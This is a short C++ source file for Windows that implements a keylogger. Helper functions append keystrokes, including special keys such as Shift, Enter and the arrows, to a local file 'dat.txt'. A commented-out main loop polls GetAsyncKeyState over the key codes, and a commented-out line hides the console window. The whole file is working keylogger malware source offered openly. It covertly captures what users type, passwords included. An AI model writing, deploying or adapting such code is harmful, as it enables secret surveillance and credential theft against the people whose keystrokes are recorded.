#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
//#include "header.h"

using namespace std;

void TLOG(string input)
{
	fstream TLOGFile;

	TLOGFile.open("dat.txt", fstream::app);

	if (TLOGFile.is_open())
	{
		TLOGFile << input;
		TLOGFile.close();
	}
}


bool SpecialKeys(int S_Key)
{
	switch (S_Key)
	{
	case VK_SPACE:
		cout << "pressed SPACE";
		TLOG(" ");
		return true;
	case VK_RETURN:
		cout << "pressed ENTER";
		TLOG("\n");
		return true;
	case '¾':
		cout << "pressed PERIOD";
		TLOG(".");
		return true;
	case VK_SHIFT:
		cout << "pressed SHIFT";
		TLOG("_SHIFT_");
		return true;
	case VK_BACK:
		cout << "pressed BACKSPACE";
		TLOG("\b");
		return true;
	case VK_RBUTTON:
		cout << "_R_CLICK_";
		TLOG("_R_CLICK_");
		return true;
	case VK_CAPITAL:
		cout << "_CAPS_LOCK_";
		TLOG("_CAPS_LCOK");
		return true;
	case VK_TAB:
		cout << "_TAB";
		TLOG("_TAB");
		return true;
	case VK_UP:
		cout << "_UP";
		TLOG("_UP_ARROW_KEY");
		return true;
	case VK_DOWN:
		cout << "_DOWN";
		TLOG("_DOWN_ARROW_KEY");
		return true;
	case VK_LEFT:
		cout << "_LEFT";
		TLOG("_LEFT_ARROW_KEY");
		return true;
	case VK_RIGHT:
		cout << "_RIGHT";
		TLOG("_RIGHT_ARROW_KEY");
		return true;
	case VK_CONTROL:
		cout << "_CONTROL";
		TLOG("_CONTROL");
		return true;
	case VK_MENU:
		cout << "_ALT";
		TLOG("_ALT");
		return true;
	default:
		return false;
	}
}



//void main()
//{
//	//stringGetter();
//	//ShowWindow(GetConsoleWindow(), SW_HIDE);
//	char KEY = 'x';
//
//	while (true)
//	{
//		Sleep(10);
//		for (int KEY = 8; KEY <= 190; KEY++)
//		{
//			if (GetAsyncKeyState(KEY) == -32767)
//			{
//				if (SpecialKeys(KEY) == false)
//				{
//					cout << "network called" << endl;
//					fstream TLOGFile;
//					TLOGFile.open("dat.txt", fstream::app);
//					if (TLOGFile.is_open())
//					{
//						TLOGFile << char(KEY);
//						TLOGFile.close();
//					}
//				}
//			}
//		}
//	}
//}

